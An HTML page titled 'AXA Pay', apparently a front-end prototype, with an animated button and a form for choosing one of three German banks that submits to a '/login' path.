<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>AXA Pay</title>
  <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

  <link rel='stylesheet prefetch' href='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>
<link rel='stylesheet prefetch' href='https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css'>

<style>
* {
    font-family: 'Roboto', sans-serif;
  }
  
  .container {
    position: absolute;
    top: 50%;
    left: 50%;
    margin-left: -65px;
    margin-top: -20px;
    width: 520px;
    height: 160px;
    text-align: center;
  }
  
  .btn {
    color: #0099CC;
    /* Text color */
    background: transparent;
    /* Remove background color */
    border: 2px solid #0099CC;
    /* Border thickness, line style, and color */
    border-radius: 140px;
    /* Adds curve to border corners */
    text-decoration: none;
    text-transform: uppercase;
    /* Make letters uppercase */
    border: none;
    color: white;
    padding: 16px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    /* Safari */
    transition-duration: 0.4s;
    cursor: pointer;
  }
  
  .btn1 {
    background-color: white;
    color: black;
    border: 2px solid #008CBA;
  }
  
  .btn1:hover {
    background-color: #008CBA;
    color: white;
  }
  
  b {
    outline: none;
    height: 160px;
    text-align: center;
    width: 520px;
    border-radius: 100px;
    background: #fff;
    border: 2px solid #008CBA;
    color: #008CBA;
    letter-spacing: 1px;
    text-shadow: 0;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.25s ease;
  }
  b:active {
    letter-spacing: 2px;
  }
  b:after {
    content: "";
  }
  
  .onclic {
    width: 10px !important;
    height: 70px !important;
    border-radius: 50% !important;
    border-color: #bbbbbb;
    border-width: 4px;
    font-size: 0;
    border-left-color: #008CBA;
    -webkit-animation: rotating 2s 0.25s linear infinite;
            animation: rotating 2s 0.25s linear infinite;
  }
  .onclic:hover {
    color: dodgerblue;
    background: white;
  }
  
  .validate {
    content: "";
    font-size: 16px;
    color: black;
    background: dodgerblue;
    border-radius: 50px;
  }
  .validate:after {
    font-family: 'FontAwesome';
    content: " done \f00c";
  }
  
  @-webkit-keyframes rotating {
    from {
      -webkit-transform: rotate(0deg);
              transform: rotate(0deg);
    }
    to {
      -webkit-transform: rotate(360deg);
              transform: rotate(360deg);
    }
  }
  
  @keyframes rotating {
    from {
      -webkit-transform: rotate(0deg);
              transform: rotate(0deg);
    }
    to {
      -webkit-transform: rotate(360deg);
              transform: rotate(360deg);
    }
  }

</style>
  
</head>

<body>
    <div class="container">
        <button id="button" class="btn btn1"> AXA Pay</button>
        <form id="form" action="/login">
            <label for="banklist"><b>Ihre Bank</b></label>
            <select name="banklist">
                <option value="apoBank">apoBank</option>
                <option value="Deutsche Bank">Deutsche Bank</option>
                <option value="Sparkasse KölnBonn">Sparkasse KölnBonn</option>
            </select>
        </form>
    </div>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js'></script>

    <script>

$(function() {
  $("#button").click(function() {
    $("#button").addClass("onclic", 250, validate);
  });

  function validate() {
    setTimeout(function() {
      $("#button").removeClass("onclic");
      $("#button").addClass("validate", 450, callback);
    }, 2250);
  }
  function callback() {
    setTimeout(function() {
      $("#button").removeClass("validate");
      // window.location.href = '/login'; 
      $("#form").submit();
    }, 1250);
  }
});

</script>

</body>

</html>
